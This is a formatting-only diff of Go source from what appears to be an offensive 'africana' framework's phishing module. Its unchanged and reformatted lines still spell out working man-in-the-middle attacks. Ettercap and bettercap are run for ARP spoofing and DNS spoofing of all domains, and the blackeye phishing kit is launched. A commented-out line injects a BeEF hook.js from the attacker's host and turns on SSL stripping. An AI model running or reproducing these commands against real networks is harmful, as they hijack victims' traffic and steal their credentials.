@@ -1,6 +1,6 @@
 package phishers
 
-import (
+import(
     "os"
     "fmt"
     "utils"
@@ -11,7 +11,7 @@ import (
     "subprocess"
 )
 
-var (
+var(
     userInput   string
     userTarget  string
     userLhost   string
@@ -65,7 +65,7 @@ func NinjaEttercap(userTarget string) {
     fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaEttercap" + bcolors.BLUE + ")" + bcolors.ENDC)
     fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
     userInput := scanner.Text()
-            switch strings.ToLower(userInput) {
+    switch strings.ToLower(userInput) {
     case "0":
         return
     case "1":
@@ -123,7 +123,8 @@ func NinjaEttercap(userTarget string) {
             panic(err)
         }
         fmt.Println()
-        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof /%s// /%s//" &; cd /root/.africana/africana-base/phishers/blackeye; bash blackeye.sh`, userIface, userTarget, userGateway); fmt.Println()
+        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof /%s// /%s//" &; cd /root/.africana/africana-base/phishers/blackeye; bash blackeye.sh`, userIface, userTarget, userGateway)
+        fmt.Println()
         subprocess.Popen(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
     case "2":
         fmt.Println()
@@ -176,7 +177,8 @@ func NinjaEttercap(userTarget string) {
         utils.Editors(filesToReplacements)
         }
         fmt.Println()
-        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof ///" &; cd /root/.africana/africana-base/phishers/blackeye; bash blackeye.sh`, userIface); fmt.Println()
+        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof ///" &; cd /root/.africana/africana-base/phishers/blackeye; bash blackeye.sh`, userIface)
+        fmt.Println()
         subprocess.Popen(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
     default:
         utils.SystemShell(userInput)
@@ -194,7 +196,7 @@ func NinjaBettercap(userTarget string) {
     fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "NinjaBettercap" + bcolors.BLUE + ")" + bcolors.ENDC)
     fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
     userInput := scanner.Text()
-            switch strings.ToLower(userInput) {
+    switch strings.ToLower(userInput) {
     case "0":
         return
     case "1":
@@ -214,7 +216,8 @@ func NinjaBettercap(userTarget string) {
         if userLhost == "" {
             userLhost = userLhostIp
         }
-        //fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set https.proxy.certificate /root/.africana/certs/africana-cert.pem; set https.proxy.key /root/.africana/certs/africana-key.pem; set arp.spoof.targets %s; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userIface, userLhost, userTarget, userLhost); fmt.Println()
+        //fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set https.proxy.certificate /root/.africana/certs/africana-cert.pem; set https.proxy.key /root/.africana/certs/africana-key.pem; set arp.spoof.targets %s; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userIface, userLhost, userTarget, userLhost)
+        fmt.Println()
         subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active'"&; cd /root/.africana/africana-base/phishers/blackeye; bash blackeye.sh`, userIface, userTarget)
     case "2":
         fmt.Println()
@@ -233,7 +236,8 @@ func NinjaBettercap(userTarget string) {
         if userLhost == "" {
             userLhost = userLhostIp
         }
-        //fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set https.proxy.certificate /root/.africana/certs/africana-cert.pem; set https.proxy.key /root/.africana/certs/africana-key.pem; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userIface, userLhost, userLhost); fmt.Println()
+        //fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set https.proxy.certificate /root/.africana/certs/africana-cert.pem; set https.proxy.key /root/.africana/certs/africana-key.pem; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userIface, userLhost, userLhost)
+        fmt.Println()
         subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active'"&; cd /root/.africana/africana-base/phishers/blackeye; bash blackeye.sh`, userIface)
     default:
         utils.SystemShell(userInput)
@@ -254,9 +258,9 @@ func NinjaPhish(userTarget string) {
         case "0":
             return
         case "1":
-            NinjaEttercap  (userTarget)
+            NinjaEttercap(userTarget)
         case "2":
-            NinjaBettercap (userTarget)
+            NinjaBettercap(userTarget)
         default:
             utils.SystemShell(userInput)
          }
